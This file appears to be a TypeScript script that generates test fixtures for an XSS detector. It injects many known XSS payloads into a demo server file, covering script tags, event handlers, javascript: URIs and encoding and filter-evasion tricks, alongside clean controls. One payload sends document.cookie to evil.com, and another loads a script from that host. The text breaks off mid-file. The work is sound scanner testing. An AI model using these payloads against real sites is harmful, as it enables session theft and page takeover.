#!/usr/bin/env bun
/**
 * stage-xss-vectors.ts — XSS Attack Vector Scenario Stager
 *
 * Generates verify scenarios from known XSS attack vectors sourced from:
 *   - PayloadsAllTheThings (swisskyrepo)
 *   - OWASP XSS Filter Evasion Cheat Sheet
 *   - html5sec.org vector database
 *   - PortSwigger XSS cheat sheet
 *
 * 12 taxonomy categories (XSS-01 through XSS-12):
 *   XSS-01: Reflected XSS (basic script/event handler injection)
 *   XSS-02: Attribute injection (onload, onerror, onfocus, etc.)
 *   XSS-03: Tag injection (img, svg, iframe, object, embed, video, audio, details)
 *   XSS-04: Protocol handlers (javascript:, data:, vbscript:)
 *   XSS-05: Encoding bypass (HTML entities, URL encoding, Unicode, hex, octal)
 *   XSS-06: Filter evasion (case variation, null bytes, whitespace, comments)
 *   XSS-07: DOM-based XSS (document.write, innerHTML, eval, setTimeout)
 *   XSS-08: Stored XSS (persistent payloads in forms, comments, profiles)
 *   XSS-09: CSP bypass (inline nonce, base-tag, JSONP)
 *   XSS-10: Framework-specific (Angular, React, Vue)
 *   XSS-11: SVG-based XSS (svg onload, foreignObject, animate)
 *   XSS-12: Mutation XSS / mXSS (noscript, style injection, table quirks)
 *
 * Each category has:
 *   - 2-3 scenarios where the pattern IS present (expectedSuccess: false)
 *   - 1-2 scenarios where the code is clean (expectedSuccess: true)
 *   - 1-2 grounding-only scenarios (fabricated claims, fails grounding)
 *
 * Run: bun scripts/harvest/stage-xss-vectors.ts
 * Output: fixtures/scenarios/xss-vectors-staged.json
 */

import { writeFileSync } from 'fs';
import { resolve } from 'path';

const outPath = resolve(__dirname, '../../fixtures/scenarios/xss-vectors-staged.json');
const scenarios: any[] = [];
let id = 1;

function push(s: any) {
  scenarios.push({ id: `xss-${String(id++).padStart(3, '0')}`, requiresDocker: false, ...s });
}

const ANCHOR_LINE = "res.end(JSON.stringify({ status: 'ok' }));";

/** Inject a payload string into server.js as a template literal assignment */
function injectEdit(payload: string) {
  return [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `const output = \`${payload.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`;\n    ${ANCHOR_LINE}`,
  }];
}

/** Inject safe code before the anchor line */
function safeEdit(safeCode: string) {
  return [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `${safeCode}\n    ${ANCHOR_LINE}`,
  }];
}

/** Inject a DOM-XSS sink pattern as a comment (scanners match these in source) */
function domSinkEdit(sinkCode: string) {
  return [{
    file: 'server.js',
    search: ANCHOR_LINE,
    replace: `// DOM XSS sink: ${sinkCode}\n    ${ANCHOR_LINE}`,
  }];
}

// =============================================================================
// XSS-01: BASIC REFLECTED XSS
// Script tags, inline event handlers, javascript: URIs in reflected context
// =============================================================================

// --- Injection detected ---
push({
  description: 'XSS-01: classic <script>alert(1)</script> injection',
  edits: injectEdit('<script>alert(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'Classic reflected XSS via script tag',
});

push({
  description: 'XSS-01: script tag with string argument',
  edits: injectEdit("<script>alert('XSS')</script>"),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'Script tag with string argument alert',
});

push({
  description: 'XSS-01: external script src injection',
  edits: injectEdit('<script src=//evil.com/xss.js></script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'External script source inclusion',
});

push({
  description: 'XSS-01: script with document.cookie exfiltration',
  edits: injectEdit('<script>new Image().src="https://evil.com/?c="+document.cookie</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'Cookie exfiltration via Image src',
});

push({
  description: 'XSS-01: script with eval',
  edits: injectEdit('<script>eval("alert(1)")</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'Eval-based XSS inside script tag',
});

push({
  description: 'XSS-01: script with Function constructor',
  edits: injectEdit('<script>Function("alert(1)")()</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'Function constructor XSS',
});

// --- Clean code ---
push({
  description: 'XSS-01 clean: demo-app server.js has no script injection',
  edits: [],
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'Unmodified server.js contains no XSS vectors',
});

push({
  description: 'XSS-01 clean: safe string literal mentioning script',
  edits: safeEdit('const tag = "script_loader";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'Word "script" in variable name is not XSS',
});

// --- Grounding-only ---
push({
  description: 'XSS-01 grounding: fabricated claim about reflected XSS in /health endpoint',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: 'res\\.send\\(req\\.query\\.q\\)' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'server.js has no reflected user input; predicate references nonexistent pattern',
});

push({
  description: 'XSS-01 grounding: fabricated claim about unsanitized URL parameter echo',
  edits: [],
  predicates: [{ type: 'html', selector: '#xss-output', expected: 'exists' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'reflected_xss', 'XSS-01'],
  rationale: 'No #xss-output element exists in any route',
});

// =============================================================================
// XSS-02: ATTRIBUTE INJECTION
// Event handler attributes: onload, onerror, onfocus, onmouseover, etc.
// =============================================================================

push({
  description: 'XSS-02: img onerror=alert(1) injection',
  edits: injectEdit('<img onerror=alert(1) src=x>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Event handler onerror on img tag',
});

push({
  description: 'XSS-02: body onload=alert(1)',
  edits: injectEdit('<body onload=alert(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Event handler onload on body tag',
});

push({
  description: 'XSS-02: input onfocus=alert(1) autofocus',
  edits: injectEdit('<input onfocus=alert(1) autofocus>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Onfocus handler triggered via autofocus',
});

push({
  description: 'XSS-02: div onmouseover handler',
  edits: injectEdit('<div onmouseover=alert(1)>hover me</div>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Onmouseover event handler injection',
});

push({
  description: 'XSS-02: button onclick handler',
  edits: injectEdit('<button onclick=alert(1)>Click</button>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Onclick event handler on button',
});

push({
  description: 'XSS-02: select onfocus autofocus',
  edits: injectEdit('<select onfocus=alert(1) autofocus>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Onfocus on select with autofocus trigger',
});

push({
  description: 'XSS-02: textarea onfocus autofocus',
  edits: injectEdit('<textarea onfocus=alert(1) autofocus>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Onfocus on textarea with autofocus trigger',
});

push({
  description: 'XSS-02: marquee onstart handler',
  edits: injectEdit('<marquee onstart=alert(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Onstart event on marquee element',
});

push({
  description: 'XSS-02: details ontoggle handler',
  edits: injectEdit('<details ontoggle=alert(1) open>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Ontoggle on details element with open attribute',
});

// --- Clean code ---
push({
  description: 'XSS-02 clean: img tag with valid src and alt only',
  edits: safeEdit('const img = "<img src=\\"/images/logo.png\\" alt=\\"logo\\">";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Img tag with valid src and alt, no event handlers',
});

push({
  description: 'XSS-02 clean: button with type attribute only',
  edits: safeEdit('const btn = "<button type=\\"submit\\">Go</button>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Button with safe type attribute, no onclick',
});

// --- Grounding-only ---
push({
  description: 'XSS-02 grounding: fabricated onload handler in homepage',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: 'onload=alert' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'No onload event handler exists in server.js',
});

// =============================================================================
// XSS-03: TAG INJECTION
// Injecting new HTML elements: img, svg, iframe, object, embed, video, audio
// =============================================================================

push({
  description: 'XSS-03: iframe src javascript injection',
  edits: injectEdit('<iframe src="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Iframe with javascript: src',
});

push({
  description: 'XSS-03: iframe onload handler',
  edits: injectEdit('<iframe onload=alert(1) src="about:blank">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Iframe with onload event handler',
});

push({
  description: 'XSS-03: object onerror handler',
  edits: injectEdit('<object onerror=alert(1) data=x>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Object tag with onerror handler',
});

push({
  description: 'XSS-03: embed src javascript',
  edits: injectEdit('<embed src="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Embed tag with javascript: protocol',
});

push({
  description: 'XSS-03: video onerror handler',
  edits: injectEdit('<video onerror=alert(1)><source src=x></video>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Video tag with onerror handler',
});

push({
  description: 'XSS-03: audio onerror handler',
  edits: injectEdit('<audio onerror=alert(1) src=x>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Audio tag with onerror handler',
});

push({
  description: 'XSS-03: keygen onfocus autofocus',
  edits: injectEdit('<keygen onfocus=alert(1) autofocus>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Deprecated keygen element with onfocus',
});

push({
  description: 'XSS-03: isindex action javascript',
  edits: injectEdit('<isindex action=javascript:alert(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Deprecated isindex with javascript: action',
});

// --- Clean ---
push({
  description: 'XSS-03 clean: sandboxed iframe without handlers',
  edits: safeEdit('const el = "<iframe src=\\"/embed\\" sandbox></iframe>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Sandboxed iframe with no event handlers',
});

push({
  description: 'XSS-03 clean: video with valid source',
  edits: safeEdit('const el = "<video controls><source src=\\"/video.mp4\\"></video>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'Video element with valid source and controls',
});

// --- Grounding-only ---
push({
  description: 'XSS-03 grounding: fabricated iframe in /about page',
  edits: [],
  predicates: [{ type: 'html', selector: 'iframe.malicious', expected: 'exists' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'tag_injection', 'XSS-03'],
  rationale: 'No iframe.malicious element exists in any route',
});

// =============================================================================
// XSS-04: PROTOCOL HANDLERS
// javascript:, data:, vbscript: URI schemes
// =============================================================================

push({
  description: 'XSS-04: javascript: href alert',
  edits: injectEdit('<a href="javascript:alert(1)">click me</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Anchor with javascript: protocol',
});

push({
  description: 'XSS-04: javascript: void with onclick',
  edits: injectEdit('<a href="javascript:void(0)" onclick="alert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'javascript:void(0) with onclick handler',
});

push({
  description: 'XSS-04: data: URI with HTML script',
  edits: injectEdit('<a href="data:text/html,<script>alert(1)</script>">go</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Data URI containing script tag',
});

push({
  description: 'XSS-04: data: URI base64 encoded script',
  edits: injectEdit('<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Base64 data URI hiding script tag',
});

push({
  description: 'XSS-04: vbscript: protocol handler',
  edits: injectEdit('<a href="vbscript:MsgBox(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'VBScript protocol handler (IE-specific)',
});

push({
  description: 'XSS-04: form action javascript protocol',
  edits: injectEdit('<form action="javascript:alert(1)"><button>submit</button></form>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Form action with javascript: protocol',
});

push({
  description: 'XSS-04: meta refresh javascript URL',
  edits: injectEdit('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Meta refresh redirect to javascript: URL',
});

push({
  description: 'XSS-04: object data javascript protocol',
  edits: injectEdit('<object data="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Object data attribute with javascript: protocol',
});

// --- Clean ---
push({
  description: 'XSS-04 clean: anchor with relative href',
  edits: safeEdit('const link = "<a href=\\"/home\\">Home</a>";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Anchor with safe relative URL',
});

push({
  description: 'XSS-04 clean: data URI for actual image',
  edits: safeEdit('const img = "<img src=\\"data:image/png;base64,iVBORw0KGgo=\\">";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Data URI for legitimate image data',
});

// --- Grounding-only ---
push({
  description: 'XSS-04 grounding: fabricated javascript: href in nav links',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: 'href="javascript:' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'No javascript: hrefs exist in server.js nav links',
});

// =============================================================================
// XSS-05: ENCODING BYPASS
// HTML entities, URL encoding, Unicode, hex, octal to evade filters
// =============================================================================

push({
  description: 'XSS-05: HTML entity decimal encoded onerror',
  edits: injectEdit('<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'HTML decimal entities spelling "alert"',
});

push({
  description: 'XSS-05: HTML entity hex encoded onerror',
  edits: injectEdit('<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'HTML hex entities spelling "alert"',
});

push({
  description: 'XSS-05: HTML entities without semicolons',
  edits: injectEdit('<img src=x onerror=&#97&#108&#101&#114&#116(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'HTML entities without trailing semicolons',
});

push({
  description: 'XSS-05: URL encoded javascript href',
  edits: injectEdit('<a href="javascript:%61lert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'URL-encoded character in javascript: URI',
});

push({
  description: 'XSS-05: double URL encoded script tags',
  edits: injectEdit('%253Cscript%253Ealert(1)%253C%252Fscript%253E'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Double URL encoding to bypass single-decode filters',
});

push({
  description: 'XSS-05: Unicode escape in script',
  edits: injectEdit('<script>\\u0061lert(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Unicode escape sequence for "a" in alert',
});

push({
  description: 'XSS-05: full Unicode escape alert',
  edits: injectEdit('<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Every character of alert as Unicode escape',
});

push({
  description: 'XSS-05: HTML entity encoded javascript: href',
  edits: injectEdit('<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Full entity encoding of javascript: protocol',
});

push({
  description: 'XSS-05: UTF-7 encoded script',
  edits: injectEdit('+ADw-script+AD4-alert(1)+ADw-/script+AD4-'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'UTF-7 encoding to bypass UTF-8 filters',
});

push({
  description: 'XSS-05: HTML entity with leading zeros',
  edits: injectEdit('<img src=x onerror=&#0000097;&#0000108;&#0000101;&#0000114;&#0000116;(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Zero-padded HTML entities spelling alert',
});

push({
  description: 'XSS-05: javascript with entity-encoded tab',
  edits: injectEdit('<a href="java&#x09;script:alert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Tab character entity inside javascript: href',
});

push({
  description: 'XSS-05: percent-encoded javascript colon',
  edits: injectEdit('<a href="javascript%3Aalert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Percent-encoded colon in javascript: protocol',
});

push({
  description: 'XSS-05: octal encoded alert in script',
  edits: injectEdit('<script>\\141\\154\\145\\162\\164(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Octal character escapes for alert',
});

// --- Clean ---
push({
  description: 'XSS-05 clean: safe HTML entity for copyright',
  edits: safeEdit('const text = "&#169; 2026 Company";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'HTML entity for copyright symbol is safe',
});

push({
  description: 'XSS-05 clean: standard URL encoding in query param',
  edits: safeEdit('const url = "/search?q=hello%20world";'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'no_findings' }],
  expectedSuccess: true,
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'URL encoding for space in query parameter',
});

// --- Grounding-only ---
push({
  description: 'XSS-05 grounding: fabricated encoded payload in /api/echo',
  edits: [],
  predicates: [{ type: 'content', file: 'server.js', pattern: '&#x61;&#x6c;&#x65;&#x72;&#x74;' }],
  expectedSuccess: false,
  expectedFailedGate: 'grounding',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'No HTML entity encoded strings exist in server.js',
});

// =============================================================================
// XSS-06: FILTER EVASION
// Case variation, null bytes, whitespace tricks, comment injection
// =============================================================================

push({
  description: 'XSS-06: mixed case <ScRiPt> tag',
  edits: injectEdit('<ScRiPt>alert(1)</ScRiPt>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Mixed case to bypass case-sensitive filters',
});

push({
  description: 'XSS-06: upper case SCRIPT tag',
  edits: injectEdit('<SCRIPT>alert(1)</SCRIPT>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'All uppercase SCRIPT tag',
});

push({
  description: 'XSS-06: null byte in script tag',
  edits: injectEdit('<scr\\0ipt>alert(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Null byte injection to break filter matching',
});

push({
  description: 'XSS-06: nested script tags',
  edits: injectEdit('<scr<script>ipt>alert(1)</scr</script>ipt>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Nested script tags surviving single-pass strip',
});

push({
  description: 'XSS-06: comment break in alert function',
  edits: injectEdit('<script>al/**/ert(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Comment insertion to break keyword matching',
});

push({
  description: 'XSS-06: HTML comment inside script tag',
  edits: injectEdit('<scri<!---->pt>alert(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'HTML comment breaking script tag parsing',
});

push({
  description: 'XSS-06: forward slash break in tag',
  edits: injectEdit('<img/onerror=alert(1) src=x>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Slash between tag name and attribute',
});

push({
  description: 'XSS-06: double open angle bracket',
  edits: injectEdit('<<script>alert(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Double angle bracket confusing parser',
});

push({
  description: 'XSS-06: backtick instead of parentheses',
  edits: injectEdit('<script>alert`1`</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Tagged template literal replacing parentheses',
});

push({
  description: 'XSS-06: throw with onerror assignment',
  edits: injectEdit('<script>onerror=alert;throw 1</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Assign onerror then throw to trigger it',
});

push({
  description: 'XSS-06: constructor prototype chain',
  edits: injectEdit('<script>[].constructor.constructor("alert(1)")()</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Prototype chain to access Function constructor',
});

push({
  description: 'XSS-06: String.fromCharCode + eval',
  edits: injectEdit('<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Char code construction of alert(1) string',
});

push({
  description: 'XSS-06: atob decode + eval',
  edits: injectEdit('<script>eval(atob("YWxlcnQoMSk="))</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'Base64 decode of alert(1) passed to eval',
});

push({
  description: 'XSS-06: prompt instead of alert',
  edits: injectEdit('<script>prompt(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
  rationale: 'prompt() as alternative to alert()',
});

push({
  description: 'XSS-06: confirm instead of alert',
  edits: injectEdit('<script>confirm(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'filter_evasion', 'XSS-06'],
